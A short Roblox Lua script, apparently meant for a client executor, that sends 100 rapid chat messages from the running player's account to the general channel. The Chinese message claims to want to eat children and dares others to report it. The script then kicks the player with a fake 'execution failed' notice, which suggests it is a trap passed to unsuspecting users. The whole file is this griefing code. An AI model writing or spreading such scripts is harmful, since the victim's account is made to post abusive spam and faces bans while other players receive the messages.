local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local player = Players.LocalPlayer
local function spamExpose()
    local textChannelContainer = TextChatService:FindFirstChild("TextChannels")
    if textChannelContainer then
        local general = textChannelContainer:FindFirstChild("RBXGeneral")
        if general then
            for i = 1, 100 do
                task.spawn(function()
                    pcall(function()
                        general:SendAsync("我要吃小孩,有本事就举报我fvv😂😂😂")
                    end)
                end)
                task.wait(0.01)
            end
        else
            warn("聊天频道RBXGeneral未找到.")
        end
    else
        warn("TextChannels未加载.")
    end
end
   
spamExpose()
task.wait(5) 
player:Kick("执行失败LOL")